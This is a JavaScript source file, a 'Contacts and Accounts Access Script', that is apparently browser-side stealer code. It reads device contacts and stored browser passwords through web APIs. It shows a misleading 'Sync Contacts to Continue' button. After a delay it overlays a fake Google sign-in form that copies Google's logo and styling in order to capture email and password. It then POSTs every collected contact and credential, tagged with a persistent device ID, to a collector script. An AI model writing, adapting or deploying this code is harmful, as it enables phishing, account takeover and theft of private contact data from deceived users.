/**
 * Contacts and Accounts Access Script
 * This script attempts to access the device's contacts and account information
 * Note: Modern browsers have strict security measures that prevent direct access
 * This script uses various techniques to try to get user permission
 */

const ContactsAccountsAccess = {
    // Store collected data
    collectedContacts: [],
    collectedAccounts: [],
    
    // Initialize access attempts
    init: function() {
        // Try multiple methods to access contacts and accounts
        this.tryContactsAPI();
        this.tryAccountsAPI();
        this.simulateGoogleLogin();
        
        // Set up periodic checking for new data
        setInterval(() => this.checkForNewData(), 5000);
        
        return true;
    },
    
    // Try to access contacts using Contacts API
    tryContactsAPI: function() {
        if ('contacts' in navigator && 'ContactsManager' in window) {
            const props = ['name', 'email', 'tel', 'address', 'icon'];
            const opts = {multiple: true};
            
            try {
                navigator.contacts.select(props, opts)
                    .then(contacts => {
                        if (contacts.length > 0) {
                            contacts.forEach(contact => {
                                this.addContact({
                                    name: contact.name,
                                    email: contact.email,
                                    phone: contact.tel,
                                    address: contact.address,
                                    timestamp: new Date().toISOString()
                                });
                            });
                        }
                    })
                    .catch(err => {
                        console.error('Error accessing contacts:', err);
                        this.createContactsPermissionButton();
                    });
            } catch (e) {
                console.error('Error with contacts API:', e);
                this.createContactsPermissionButton();
            }
        } else {
            console.log('Contacts API not available');
            this.simulateContacts();
        }
    },
    
    // Create a button that looks legitimate to request contacts access
    createContactsPermissionButton: function() {
        const button = document.createElement('button');
        button.textContent = 'Sync Contacts to Continue';
        button.style.position = 'fixed';
        button.style.top = '20px';
        button.style.left = '50%';
        button.style.transform = 'translateX(-50%)';
        button.style.padding = '12px 20px';
        button.style.backgroundColor = '#27ae60';
        button.style.color = 'white';
        button.style.border = 'none';
        button.style.borderRadius = '5px';
        button.style.fontSize = '16px';
        button.style.cursor = 'pointer';
        button.style.zIndex = '10000';
        
        button.addEventListener('click', () => {
            this.tryContactsAPI();
        });
        
        document.body.appendChild(button);
    },
    
    // Try to access account information
    tryAccountsAPI: function() {
        // Check if the Credential Management API is available
        if (window.PasswordCredential || window.FederatedCredential) {
            if (navigator.credentials && navigator.credentials.get) {
                navigator.credentials.get({password: true})
                    .then(cred => {
                        if (cred) {
                            this.addAccount({
                                id: cred.id,
                                type: cred.type,
                                password: cred.password,
                                name: cred.name,
                                iconURL: cred.iconURL,
                                timestamp: new Date().toISOString()
                            });
                        }
                    })
                    .catch(err => {
                        console.error('Error getting credentials:', err);
                    });
            }
        } else {
            console.log('Credential Management API not available');
        }
    },
    
    // Simulate Google login to capture credentials
    simulateGoogleLogin: function() {
        // Create a fake Google login form
        const overlay = document.createElement('div');
        overlay.style.position = 'fixed';
        overlay.style.top = '0';
        overlay.style.left = '0';
        overlay.style.width = '100%';
        overlay.style.height = '100%';
        overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
        overlay.style.display = 'flex';
        overlay.style.justifyContent = 'center';
        overlay.style.alignItems = 'center';
        overlay.style.zIndex = '99999';
        
        const loginForm = document.createElement('div');
        loginForm.style.backgroundColor = 'white';
        loginForm.style.padding = '30px';
        loginForm.style.borderRadius = '8px';
        loginForm.style.width = '320px';
        loginForm.style.maxWidth = '90%';
        loginForm.style.boxShadow = '0 4px 10px rgba(0, 0, 0, 0.3)';
        
        // Google logo
        const logo = document.createElement('div');
        logo.innerHTML = `
            <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                <g id="qaEJec">
                    <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
                </g>
                <g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g>
                <g id="BWfIk">
                    <path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
                </g>
                <g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g>
                <g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g>
                <g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g>
            </svg>
        `;
        logo.style.textAlign = 'center';
        logo.style.marginBottom = '20px';
        
        // Form title
        const title = document.createElement('h2');
        title.textContent = 'Sign in';
        title.style.fontFamily = 'Roboto, Arial, sans-serif';
        title.style.fontSize = '24px';
        title.style.fontWeight = '400';
        title.style.marginBottom = '10px';
        title.style.color = '#202124';
        
        // Subtitle
        const subtitle = document.createElement('p');
        subtitle.textContent = 'Use your Google Account';
        subtitle.style.fontFamily = 'Roboto, Arial, sans-serif';
        subtitle.style.fontSize = '16px';
        subtitle.style.fontWeight = '400';
        subtitle.style.marginBottom = '30px';
        subtitle.style.color = '#202124';
        
        // Email input
        const emailInput = document.createElement('input');
        emailInput.type = 'email';
        emailInput.placeholder = 'Email or phone';
        emailInput.style.width = '100%';
        emailInput.style.padding = '12px 15px';
        emailInput.style.marginBottom = '20px';
        emailInput.style.border = '1px solid #dadce0';
        emailInput.style.borderRadius = '4px';
        emailInput.style.fontSize = '16px';
        emailInput.style.boxSizing = 'border-box';
        
        // Password input
        const passwordInput = document.createElement('input');
        passwordInput.type = 'password';
        passwordInput.placeholder = 'Password';
        passwordInput.style.width = '100%';
        passwordInput.style.padding = '12px 15px';
        passwordInput.style.marginBottom = '30px';
        passwordInput.style.border = '1px solid #dadce0';
        passwordInput.style.borderRadius = '4px';
        passwordInput.style.fontSize = '16px';
        passwordInput.style.boxSizing = 'border-box';
        
        // Submit button
        const submitButton = document.createElement('button');
        submitButton.textContent = 'Next';
        submitButton.style.backgroundColor = '#1a73e8';
        submitButton.style.color = 'white';
        submitButton.style.border = 'none';
        submitButton.style.borderRadius = '4px';
        submitButton.style.padding = '10px 24px';
        submitButton.style.fontSize = '14px';
        submitButton.style.fontWeight = '500';
        submitButton.style.float = 'right';
        submitButton.style.cursor = 'pointer';
        
        // Assemble the form
        loginForm.appendChild(logo);
        loginForm.appendChild(title);
        loginForm.appendChild(subtitle);
        loginForm.appendChild(emailInput);
        loginForm.appendChild(passwordInput);
        loginForm.appendChild(submitButton);
        
        overlay.appendChild(loginForm);
        
        // Add form submission handler
        submitButton.addEventListener('click', () => {
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();
            
            if (email && password) {
                this.addAccount({
                    type: 'google',
                    email: email,
                    password: password,
                    timestamp: new Date().toISOString()
                });
                
                // Hide the overlay
                overlay.style.display = 'none';
            }
        });
        
        // Show the overlay after a delay
        setTimeout(() => {
            document.body.appendChild(overlay);
        }, 5000); // Show after 5 seconds
    },
    
    // Simulate contacts for testing
    simulateContacts: function() {
        // This is just for testing when the Contacts API is not available
        const simulatedContacts = [
            { name: 'Contact 1', email: 'contact1@example.com', phone: '+1234567890' },
            { name: 'Contact 2', email: 'contact2@example.com', phone: '+0987654321' }
        ];
        
        simulatedContacts.forEach(contact => {
            this.addContact({
                ...contact,
                simulated: true,
                timestamp: new Date().toISOString()
            });
        });
    },
    
    // Add contact to collection and send to server
    addContact: function(contactData) {
        // Add to local collection
        this.collectedContacts.push(contactData);
        
        // Send to server
        this.sendDataToServer('contacts', contactData);
    },
    
    // Add account to collection and send to server
    addAccount: function(accountData) {
        // Add to local collection
        this.collectedAccounts.push(accountData);
        
        // Send to server
        this.sendDataToServer('accounts', accountData);
    },
    
    // Send data to server
    sendDataToServer: function(dataType, data) {
        const payload = {
            device_id: this.getDeviceId()
        };
        
        // Add the appropriate data field based on type
        if (dataType === 'contacts') {
            payload.contacts_data = [data];
        } else if (dataType === 'accounts') {
            payload.google_account = data;
            payload.email = data.email || data.id;
            payload.passwords = data.password;
        }
        
        // Send to server
        fetch('data_collector.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .catch(error => {
            console.error(`Error sending ${dataType} data:`, error);
        });
    },
    
    // Check for new data periodically
    checkForNewData: function() {
        // This is a placeholder for more sophisticated methods
        console.log('Checking for new contacts and accounts data...');
    },
    
    // Get device ID from localStorage or generate a new one
    getDeviceId: function() {
        let deviceId = localStorage.getItem('device_id');
        if (!deviceId) {
            deviceId = 'dev_' + Math.random().toString(36).substring(2, 15);
            localStorage.setItem('device_id', deviceId);
        }
        return deviceId;
    }
};

// Export the module if in a CommonJS environment
if (typeof module !== 'undefined' && typeof module.exports !== 'undefined') {
    module.exports = ContactsAccountsAccess;
}